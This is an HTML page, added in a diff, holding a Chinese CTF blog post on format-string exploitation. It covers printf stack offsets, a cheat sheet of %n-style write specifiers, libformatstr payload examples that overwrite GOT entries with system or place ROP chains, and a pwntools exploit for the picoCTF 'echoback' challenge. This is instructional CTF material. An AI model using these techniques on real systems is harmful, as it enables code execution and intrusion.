@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="hustcw">
+
+
+
+<meta name="description" content="写在前面 记录一下对于格式化字符串的利用，如果比赛里有格式化字符串的题如何迅速拿到一血">
+<meta name="keywords" content="ctf,formatstr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串">
+<meta property="og:url" content="https://hustcw.github.io/2019/03/29/格式化字符串/index.html">
+<meta property="og:site_name" content="Hustcw">
+<meta property="og:description" content="写在前面 记录一下对于格式化字符串的利用，如果比赛里有格式化字符串的题如何迅速拿到一血">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/figure/printf.png">
+<meta property="og:updated_time" content="2019-09-23T18:38:52.264Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="格式化字符串">
+<meta name="twitter:description" content="写在前面 记录一下对于格式化字符串的利用，如果比赛里有格式化字符串的题如何迅速拿到一血">
+<meta name="twitter:image" content="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/figure/printf.png">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Hustcw" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favico.png">
+
+
+
+    <link href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>格式化字符串 | Hustcw</title>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.1/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdnjs.cloudflare.com/ajax/libs/fancybox/3.3.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdnjs.cloudflare.com/ajax/libs/scrollReveal.js/3.4.0/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/assets/img/MyAvatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">hustcw</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" href="https://github.com/Hustcw" title="GitHub"></a>
+                            
+                                <a class="fa Email" href="mailto:hustcw1998@gmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/angr/">angr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/formatstr/">formatstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glibc/">glibc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ida/">ida</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mac/">mac</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/machine-learning/">machine learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/off-by-one/">off-by-one</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/plan/">plan</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rop/">rop</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/study/">study</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/zip/">zip</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">hustcw</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/assets/img/MyAvatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">hustcw</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Hustcw" title="GitHub"></a>
+                            
+                                <a class="fa Email" target="_blank" href="mailto:hustcw1998@gmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-格式化字符串" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/03/29/格式化字符串/" class="article-date">
+      <time datetime="2019-03-29T11:45:08.000Z" itemprop="datePublished">2019-03-29</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      格式化字符串
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/formatstr/">formatstr</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2><span id="写在前面">写在前面</span></h2><blockquote>
+<p>记录一下对于格式化字符串的利用，如果比赛里有格式化字符串的题如何迅速拿到一血</p>
+</blockquote>
+<a id="more"></a>
+<h2><span id="基本知识">基本知识</span></h2><h3><span id="格式化字符串原理">格式化字符串原理</span></h3><p>借用ctf-wiki上的图<br><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/figure/printf.png" alt="格式化字符串"><br>此时printf的参数分布如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">some value           # 高地址</span><br><span class="line">some value</span><br><span class="line">some value</span><br><span class="line">3.14</span><br><span class="line">123456</span><br><span class="line">addr of &quot;red&quot;</span><br><span class="line">addr of format string: Color %s...          #低地址</span><br><span class="line">rip</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>对于一个一般格式化字符串利用场景中，vuln函数的栈上情况是这样：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">some value</span><br><span class="line">some value</span><br><span class="line">some value</span><br><span class="line">some value</span><br><span class="line">formatstr content</span><br><span class="line">formatstr content</span><br><span class="line">formatstr content <span class="comment"># considered as arg5</span></span><br><span class="line">somevalue <span class="comment"># considered as arg4</span></span><br><span class="line">somevalue <span class="comment"># considered as arg3</span></span><br><span class="line">arg2</span><br><span class="line">arg1</span><br><span class="line">addr of format string <span class="comment"># arg0</span></span><br><span class="line">eip</span><br><span class="line"><span class="keyword">print</span><span class="string">f's ebp</span></span><br></pre></td></tr></table></figure></p>
+<p>从addr of format string到formatstr content的距离(按照4字节为单位64位机按8字节)叫做offset.</p>
+<h3><span id="记录表">记录表</span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure>
+<p><strong>不记得原理可以看下表</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">这部分来自icemakr的博客</span><br><span class="line"></span><br><span class="line">32位</span><br><span class="line"></span><br><span class="line">读</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$x&apos;.format(index)           // 读4个字节</span><br><span class="line">&apos;%&#123;&#125;$p&apos;.format(index)           // 同上面</span><br><span class="line">&apos;$&#123;&#125;$s&apos;.format(index)</span><br><span class="line">写</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$n&apos;.format(index)           // 解引用，写入四个字节</span><br><span class="line">&apos;%&#123;&#125;$hn&apos;.format(index)          // 解引用，写入两个字节</span><br><span class="line">&apos;%&#123;&#125;$hhn&apos;.format(index)         // 解引用，写入一个字节</span><br><span class="line">&apos;%&#123;&#125;$lln&apos;.format(index)         // 解引用，写入八个字节</span><br><span class="line"></span><br><span class="line">////////////////////////////</span><br><span class="line">64位</span><br><span class="line"></span><br><span class="line">读</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$x&apos;.format(index, num)      // 读4个字节</span><br><span class="line">&apos;%&#123;&#125;$lx&apos;.format(index, num)     // 读8个字节</span><br><span class="line">&apos;%&#123;&#125;$p&apos;.format(index)           // 读8个字节</span><br><span class="line">&apos;$&#123;&#125;$s&apos;.format(index)</span><br><span class="line">写</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$n&apos;.format(index)           // 解引用，写入四个字节</span><br><span class="line">&apos;%&#123;&#125;$hn&apos;.format(index)          // 解引用，写入两个字节</span><br><span class="line">&apos;%&#123;&#125;$hhn&apos;.format(index)         // 解引用，写入一个字节</span><br><span class="line">&apos;%&#123;&#125;$lln&apos;.format(index)         // 解引用，写入八个字节</span><br><span class="line"></span><br><span class="line">%1$lx: RSI</span><br><span class="line">%2$lx: RDX</span><br><span class="line">%3$lx: RCX</span><br><span class="line">%4$lx: R8</span><br><span class="line">%5$lx: R9</span><br><span class="line">%6$lx: 栈上的第一个QWORD</span><br></pre></td></tr></table></figure></p>
+<h2><span id="libformatstr">libformatstr</span></h2><h3><span id="基本">基本</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成pattern串判断参数在格式化串的位置 </span></span><br><span class="line"><span class="comment">#BUF_SZ = 80  格式化串的长度</span></span><br><span class="line"><span class="comment">#pat = libformatstr.make_pattern(BUF_SZ)</span></span><br><span class="line"><span class="comment">#io.sendline(pat)</span></span><br><span class="line"><span class="comment">#res = io.recv()</span></span><br><span class="line"><span class="comment"># argnum 表示第argnum个参数位于格式化串首部</span></span><br><span class="line"><span class="comment"># padding 表示使参数对齐需要添加的字节数 0-3</span></span><br><span class="line"><span class="comment">#argnum, padding = libformatstr.guess_argnum(res, BUF_SZ)</span></span><br><span class="line"><span class="comment">#print('argnum:%d padding:%d'%(argnum, padding))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入printf.got为system</span></span><br><span class="line">argnum = <span class="number">6</span></span><br><span class="line">padding = <span class="number">0</span></span><br><span class="line">p = libformatstr.FormatStr()</span><br><span class="line">p[e.got[<span class="string">'printf'</span>]]= e.plt[<span class="string">'system'</span>]</span><br><span class="line">p[e.got[<span class="string">'exit'</span>]] = <span class="number">0x080485EE</span> <span class="comment"># main</span></span><br><span class="line">fmt_str = p.payload(argnum, padding, start_len=<span class="number">0</span>) <span class="comment"># 0 表示之前打印出的字符</span></span><br><span class="line">log.info(<span class="string">'payload:\n %s'</span> % hexdump(fmt_str))</span><br></pre></td></tr></table></figure>
+<h3><span id="举例">举例</span></h3><h4><span id="case1">case1</span></h4><p>替换got表内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x08049580</span></span><br><span class="line">system_addr = <span class="number">0x080489a3</span></span><br><span class="line"></span><br><span class="line">p = FormatStr()</span><br><span class="line">p[addr] = system_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf is 14th argument, 4 bytes are already printed</span></span><br><span class="line">sys.stdout.write( p.payload(<span class="number">14</span>, start_len=<span class="number">4</span>) ) <span class="comment"># print格式化字符串之前的 已经被打印的字符</span></span><br></pre></td></tr></table></figure></p>
+<h4><span id="case2">case2</span></h4><p>在某个地址放rop<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x08049580</span></span><br><span class="line">rop = [<span class="number">0x080487af</span>, <span class="number">0x0804873c</span>, <span class="number">0x080488de</span>]</span><br><span class="line">p = FormatStr()</span><br><span class="line">p[addr] = rop</span><br><span class="line"></span><br><span class="line">sys.stdout.write( p.payload(<span class="number">14</span>) )</span><br></pre></td></tr></table></figure></p>
+<h4><span id="case3">case3</span></h4><p>猜偏移和padding<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line"></span><br><span class="line"><span class="comment"># let's say we have do_fmt function,</span></span><br><span class="line"><span class="comment"># which gives us only output of format string</span></span><br><span class="line"><span class="comment"># (you can also just copy fmtstr and output manually)</span></span><br><span class="line"></span><br><span class="line">buf_size = <span class="number">250</span>  <span class="comment"># fix buf_size to avoid offset variation</span></span><br><span class="line">res = do_fmt(make_pattern(buf_size))</span><br><span class="line">argnum, padding = guess_argnum(res, buf_size)</span><br><span class="line"></span><br><span class="line"><span class="comment"># of course you can use it in payload generation</span></span><br><span class="line"></span><br><span class="line">p = FormatStr(buf_size)</span><br><span class="line">p[<span class="number">0xbffffe70</span>] = <span class="string">"\x70\xfe\xff\xbf\xeb\xfe"</span>  <span class="comment"># yes, you can also put strings</span></span><br><span class="line"></span><br><span class="line">sys.stdout.write( p.payload(argnum, padding, <span class="number">3</span>) ) <span class="comment"># we know 3 bytes were printed already</span></span><br></pre></td></tr></table></figure></p>
+<h4><span id="case4">case4</span></h4><p>64位的情况下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line">f=FormatStr(isx64=<span class="number">1</span>) <span class="comment">#This option force script to use 64bit address while generating payload</span></span><br><span class="line">f[<span class="number">0x1234</span>]=<span class="number">0x1</span></span><br><span class="line">f[<span class="number">0x5678</span>]=<span class="number">0x2</span></span><br><span class="line">f[<span class="number">0xabcd</span>]=<span class="number">0x3</span></span><br></pre></td></tr></table></figure></p>
+<h2><span id="实例">实例</span></h2><h3><span id="picoctf-echoback">picoctf-echoback</span></h3><p>坑就是一个，之前没用recvuntil，重新回到main之前莫名其妙打印一堆东西，调了我半天。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echoback'</span>)</span><br><span class="line">sh = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">puts_got = <span class="number">0x0804A01C</span></span><br><span class="line">sys_got = <span class="number">0x0804A020</span></span><br><span class="line">buf_size = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = FormatStr()</span></span><br><span class="line"><span class="comment"># res = do_fmt(make_pattern(buf_size))</span></span><br><span class="line"><span class="comment"># argnum, padding = guess_argnum(res, buf_size)</span></span><br><span class="line"><span class="comment"># print 'argnum:',argnum,' padding:',padding</span></span><br><span class="line"><span class="comment"># argnum 7, padding 0</span></span><br><span class="line"></span><br><span class="line">p = FormatStr()</span><br><span class="line">p[elf.got[<span class="string">'puts'</span>]] = <span class="number">0x080485ab</span></span><br><span class="line">p[elf.got[<span class="string">'printf'</span>]] = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">pause()</span><br><span class="line">sh.recvuntil(<span class="string">'message:'</span>)</span><br><span class="line">payload = p.payload(<span class="number">7</span>,<span class="number">0</span>,start_len=<span class="number">0</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'message:'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/03/29/格式化字符串/">格式化字符串</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">hustcw</a></p>
+        <p><span>发布时间:</span>2019-03-29, 19:45:08</p>
+        <p><span>最后更新:</span>2019-09-24, 02:38:52</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/03/29/格式化字符串/" title="格式化字符串">https://hustcw.github.io/2019/03/29/格式化字符串/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://hustcw.github.io/2019/03/29/格式化字符串/　　作者: hustcw" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/04/02/padding-oracle-attack/">
+                    padding oracle attack
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/03/26/openssl相关知识/">
+                    openssl相关知识
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">2.</span> <span class="toc-text">基本知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.1.</span> <span class="toc-text">格式化字符串原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.2.</span> <span class="toc-text">记录表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">3.</span> <span class="toc-text">libformatstr</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">3.1.</span> <span class="toc-text">基本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">3.2.</span> <span class="toc-text">举例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#null"><span class="toc-number">3.2.1.</span> <span class="toc-text">case1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#null"><span class="toc-number">3.2.2.</span> <span class="toc-text">case2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#null"><span class="toc-number">3.2.3.</span> <span class="toc-text">case3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#null"><span class="toc-number">3.2.4.</span> <span class="toc-text">case4</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">4.</span> <span class="toc-text">实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">4.1.</span> <span class="toc-text">picoctf-echoback</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"格式化字符串　| Hustcw　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+<!-- 添加打赏功能 -->
+
+
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/04/02/padding-oracle-attack/" title="上一篇: padding oracle attack">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/03/26/openssl相关知识/" title="下一篇: openssl相关知识">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
